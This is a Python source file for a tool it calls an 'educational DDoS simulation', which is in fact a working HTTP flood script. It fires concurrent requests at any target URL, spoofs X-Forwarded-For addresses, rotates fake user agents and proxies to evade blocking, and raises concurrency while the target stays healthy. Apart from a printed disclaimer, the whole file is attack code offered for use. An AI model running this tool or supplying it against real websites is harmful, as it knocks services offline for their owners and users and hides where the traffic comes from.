import asyncio
import aiohttp
import time
import random
import argparse
import json
import logging
from logging.handlers import RotatingFileHandler
from faker import Faker
from dataclasses import dataclass
from typing import Dict, List, Optional
from tqdm import tqdm
import matplotlib.pyplot as plt
from concurrent.futures import ThreadPoolExecutor
from aiohttp import ClientSession
import statistics
import aiohttp.client_exceptions

# Setup advanced logging with rotation
logger = logging.getLogger("DDoSLogger")
logger.setLevel(logging.DEBUG)
handler = RotatingFileHandler(
    "ddos_attack_advanced.log",
    maxBytes=10*1024*1024,  # 10MB per file
    backupCount=5  # Keep 5 backup files
)
handler.setFormatter(logging.Formatter(
    "%(asctime)s - %(levelname)s - %(filename)s:%(lineno)d - %(message)s"
))
logger.addHandler(handler)

fake = Faker()

# Attack Profile Definition
@dataclass
class AttackProfile:
    name: str
    methods: list
    headers: dict
    payload_generator: callable
    delay_variance: float
    bandwidth_limit: int  # Bytes per second
    fragment_size: int    # Simulate packet fragmentation

    def generate_request(self, request_id: int, url: str, proxies: list = None) -> dict:
        method = random.choice(self.methods)
        headers = {k: v() if callable(v) else v for k, v in self.headers.items()}
        headers["X-Forwarded-For"] = fake.ipv4()  # Simulate IP spoofing
        headers["X-Fragment-ID"] = str(random.randint(1, 1000))  # Simulate fragmentation
        payload = self.payload_generator()
        proxy = random.choice(proxies) if proxies else None
        return {
            "id": request_id,
            "method": method,
            "url": url,
            "headers": headers,
            "payload": payload,
            "delay_variance": self.delay_variance,
            "proxy": proxy,
            "bandwidth_limit": self.bandwidth_limit,
            "fragment_size": self.fragment_size
        }

# Default Profiles
DEFAULT_PROFILES = [
    AttackProfile(
        name="Normal Traffic",
        methods=["GET"],
        headers={"User-Agent": lambda: fake.user_agent(), "Accept": "*/*"},
        payload_generator=lambda: None,
        delay_variance=0.1,
        bandwidth_limit=1024*1024,  # 1MB/s
        fragment_size=0
    ),
    AttackProfile(
        name="API Stress",
        methods=["POST", "PUT"],
        headers={"User-Agent": lambda: fake.user_agent(), "Content-Type": "application/json"},
        payload_generator=lambda: json.dumps({"id": random.randint(1, 1000), "data": fake.text(max_nb_chars=1024)}),
        delay_variance=0.05,
        bandwidth_limit=512*1024,   # 512KB/s
        fragment_size=512
    ),
    AttackProfile(
        name="Heavy Load",
        methods=["POST"],
        headers={"User-Agent": lambda: fake.user_agent(), "Content-Length": "4096"},
        payload_generator=lambda: fake.text(max_nb_chars=4096),
        delay_variance=0.02,
        bandwidth_limit=256*1024,   # 256KB/s
        fragment_size=1024
    )
]

# Metrics Class with Enhanced Tracking
class Metrics:
    def __init__(self):
        self.success = 0
        self.failure = 0
        self.response_times = []
        self.retries = 0
        self.errors = {"timeout": 0, "connection": 0, "other": 0}
        self.lock = asyncio.Lock()
        self.start_time = time.time()

    async def record(self, success: bool, response_time: float, retry: bool = False, error_type: str = None):
        async with self.lock:
            logger.debug(f"Recording: success={success}, response_time={response_time}, retry={retry}, error_type={error_type}")
            if success:
                self.success += 1
            else:
                self.failure += 1
                if error_type:
                    self.errors[error_type] = self.errors.get(error_type, 0) + 1
            self.response_times.append(response_time)
            if retry:
                self.retries += 1

    def summary(self) -> Dict:
        total = self.success + self.failure
        avg_time = statistics.mean(self.response_times) if self.response_times else 0
        std_dev = statistics.stdev(self.response_times) if len(self.response_times) > 1 else 0
        summary = {
            "total": total,
            "success": self.success,
            "failure": self.failure,
            "retries": self.retries,
            "success_rate": (self.success / total) * 100 if total > 0 else 0,
            "avg_response_time": avg_time,
            "min_response_time": min(self.response_times or [0]),
            "max_response_time": max(self.response_times or [0]),
            "std_dev_response_time": std_dev,
            "response_times": self.response_times,  # Always included
            "errors": self.errors.copy(),
            "requests_per_second": total / (time.time() - self.start_time) if (time.time() - self.start_time) > 0 else 0
        }
        logger.debug(f"Summary generated: {summary}")
        return summary

    def real_time_stats(self):
        summary = self.summary()
        return (f"Real-Time: Success: {summary['success']} | Fail: {summary['failure']} | "
                f"Retries: {summary['retries']} | Avg Time: {summary['avg_response_time']:.3f}s | "
                f"Req/s: {summary['requests_per_second']:.2f}")

# Plotting Function with Robustness
def plot_metrics(metrics_summary: Dict):
    try:
        logger.debug(f"Plotting metrics: {metrics_summary}")
        if "response_times" not in metrics_summary or not metrics_summary["response_times"]:
            logger.warning("No response times available to plot. Generating empty plot.")
            print("No response time data to plot. Check logs for details.")
            plt.figure(figsize=(14, 8))
            plt.title("DDoS Attack Response Time Distribution (No Data)")
            plt.xlabel("Time (s)")
            plt.ylabel("Frequency")
            plt.grid(True, alpha=0.3)
            plt.savefig("attack_response_times_advanced.png")
            plt.close()
            return
        
        plt.figure(figsize=(14, 8))
        plt.hist(metrics_summary["response_times"], bins=50, color='red', alpha=0.7, label="Response Times")
        plt.axvline(metrics_summary["avg_response_time"], color='blue', linestyle='dashed', linewidth=1, label=f"Avg: {metrics_summary['avg_response_time']:.2f}s")
        plt.title("Advanced DDoS Attack Response Time Distribution")
        plt.xlabel("Time (s)")
        plt.ylabel("Frequency")
        plt.legend()
        plt.grid(True, alpha=0.3)
        plt.savefig("attack_response_times_advanced.png")
        plt.close()
        print("Response time distribution saved as 'attack_response_times_advanced.png'")
    except Exception as e:
        logger.error(f"Error in plot_metrics: {e}", exc_info=True)
        print(f"Failed to generate plot: {e}")

# Health Check Function
async def check_target_health(url: str, timeout: float = 5) -> bool:
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as response:
                return response.status == 200
    except Exception as e:
        logger.debug(f"Health check failed for {url}: {e}")
        return False

# Validate Proxy
def validate_proxy(proxy: str, timeout: float = 5) -> bool:
    try:
        with aiohttp.ClientSession() as session:
            asyncio.run(session.get("http://example.com", proxy=proxy, timeout=aiohttp.ClientTimeout(total=timeout)))
        return True
    except Exception as e:
        logger.debug(f"Proxy validation failed for {proxy}: {e}")
        return False

# Async Request Sender with Advanced Features
async def send_request(session: ClientSession, req: Dict, metrics: Metrics, rate_limit: float, progress: tqdm, max_retries: int = 3):
    attempt = 0
    while attempt < max_retries:
        try:
            start_time = time.time()
            proxy = req.get("proxy")
            payload_size = len(req["payload"].encode('utf-8')) if req["payload"] else 0
            fragment_delay = payload_size / req["fragment_size"] if req["fragment_size"] > 0 else 0
            delay = max(payload_size / req["bandwidth_limit"], fragment_delay) if req["bandwidth_limit"] > 0 else 0
            await asyncio.sleep(delay)
            
            async with session.request(
                method=req["method"],
                url=req["url"],
                headers=req["headers"],
                data=req["payload"],
                timeout=aiohttp.ClientTimeout(total=5),
                proxy=proxy
            ) as response:
                elapsed_time = time.time() - start_time
                await metrics.record(success=response.status == 200, response_time=elapsed_time)
                logger.info(f"Request {req['id']}: {req['method']} - Status {response.status} - Time {elapsed_time:.3f}s")
                break
        except aiohttp.client_exceptions.ClientConnectorError:
            elapsed_time = time.time() - start_time
            attempt += 1
            await metrics.record(False, elapsed_time, retry=(attempt < max_retries), error_type="connection")
            logger.error(f"Request {req['id']}: {req['method']} - Attempt {attempt}/{max_retries} - Connection Error")
        except asyncio.TimeoutError:
            elapsed_time = time.time() - start_time
            attempt += 1
            await metrics.record(False, elapsed_time, retry=(attempt < max_retries), error_type="timeout")
            logger.error(f"Request {req['id']}: {req['method']} - Attempt {attempt}/{max_retries} - Timeout")
        except Exception as e:
            elapsed_time = time.time() - start_time
            attempt += 1
            await metrics.record(False, elapsed_time, retry=(attempt < max_retries), error_type="other")
            logger.error(f"Request {req['id']}: {req['method']} - Attempt {attempt}/{max_retries} - Error: {e}")
            if attempt == max_retries:
                logger.error(f"Request {req['id']} failed after {max_retries} retries")
            await asyncio.sleep(random.uniform(0.1, 0.5))
    progress.update(1)
    await asyncio.sleep(rate_limit + random.uniform(0, req["delay_variance"]))
    print(f"\r{metrics.real_time_stats()}", end="")

# Main Attack Function with Adaptive Concurrency
async def run_attack(url: str, request_count: int, initial_concurrency: int, rate_limit: float, profiles: List[AttackProfile], proxies: Optional[List[str]] = None) -> Metrics:
    metrics = Metrics()
    requests_list = [
        profile.generate_request(i, url, proxies)
        for i in range(1, request_count + 1)
        for profile in random.choices(profiles, k=1)
    ]
    
    print(f"\nStarting Advanced DDoS Simulation on {url} by It Is Unique Official")
    print(f"Requests: {request_count}, Initial Concurrency: {initial_concurrency}, Rate Limit: {rate_limit}s")
    
    concurrency = initial_concurrency
    with tqdm(total=request_count, desc="Attack Progress", unit="req", position=0) as progress:
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i, req in enumerate(requests_list):
                tasks.append(send_request(session, req, metrics, rate_limit, progress))
                if i % 100 == 0:  # Adjust concurrency every 100 requests
                    summary = metrics.summary()
                    if summary["success_rate"] > 80 and concurrency < initial_concurrency * 2:
                        concurrency += 10  # Increase concurrency if target is healthy
                        logger.info(f"Increased concurrency to {concurrency}")
                    elif summary["success_rate"] < 20 and concurrency > 10:
                        concurrency -= 10  # Decrease if target is struggling
                        logger.info(f"Decreased concurrency to {concurrency}")
            await asyncio.gather(*tasks[:concurrency])  # Initial batch
            remaining_tasks = tasks[concurrency:]
            while remaining_tasks:
                batch = remaining_tasks[:concurrency]
                remaining_tasks = remaining_tasks[concurrency:]
                await asyncio.gather(*batch)
    
    return metrics

# Proxy Validation in Parallel
def validate_proxies(proxies: List[str]) -> List[str]:
    if not proxies:
        return []
    valid_proxies = []
    with ThreadPoolExecutor() as executor:
        results = list(executor.map(validate_proxy, proxies))
    for proxy, is_valid in zip(proxies, results):
        if is_valid:
            valid_proxies.append(proxy)
        else:
            logger.warning(f"Proxy {proxy} failed validation and will be skipped")
    return valid_proxies

# Execute Attack with Health Check
def execute_attack(url: str, request_count: int, concurrency: int, rate_limit: float, proxies: Optional[List[str]] = None):
    start_time = time.time()
    logger.info(f"Starting attack with params: url={url}, requests={request_count}, concurrency={concurrency}, rate_limit={rate_limit}")
    
    # Initial health check
    if not asyncio.run(check_target_health(url)):
        logger.error(f"Target {url} is not reachable. Aborting attack.")
        print(f"Error: Target {url} is not reachable. Aborting.")
        return
    
    valid_proxies = validate_proxies(proxies or [])
    if proxies and not valid_proxies:
        print("Warning: No valid proxies found. Proceeding without proxies.")
        logger.warning("No valid proxies available.")
    
    metrics = asyncio.run(run_attack(url, request_count, concurrency, rate_limit, DEFAULT_PROFILES, valid_proxies))
    total_time = time.time() - start_time
    
    summary = metrics.summary()
    print("\n\n=== Advanced DDoS Simulation Summary ===")
    print("Developed by It Is Unique Official")
    for key, value in summary.items():
        if key not in ["response_times", "errors"]:  # Skip large lists
            print(f"{key.replace('_', ' ').title()}: {value:.2f}" if isinstance(value, float) else f"{key.replace('_', ' ').title()}: {value}")
    print("Error Breakdown:")
    for err_type, count in summary["errors"].items():
        print(f"  {err_type.title()}: {count}")
    print(f"Total Time Taken: {total_time:.2f}s")
    
    plot_metrics(summary)
    logger.info(f"Attack completed in {total_time:.2f}s")

# CLI Setup
def main():
    parser = argparse.ArgumentParser(description="Network-DDoS: Advanced Educational DDoS Simulation Tool by It Is Unique Official")
    parser.add_argument("--url", required=True, help="Target URL to simulate attack on")
    parser.add_argument("--requests", type=int, default=500, help="Number of requests to send")
    parser.add_argument("--concurrency", type=int, default=50, help="Initial number of concurrent connections")
    parser.add_argument("--rate-limit", type=float, default=0.05, help="Delay between requests (seconds)")
    parser.add_argument("--proxies", nargs="*", help="List of proxy URLs (e.g., http://proxy:port)")
    
    args = parser.parse_args()
    
    print("\nWARNING: This tool is for EDUCATIONAL PURPOSES ONLY. Use it only on servers you own or have permission to test.")
    print("Unauthorized use is illegal and unethical.\n")
    
    execute_attack(args.url, args.requests, args.concurrency, args.rate_limit, args.proxies)

if __name__ == "__main__":
    main()
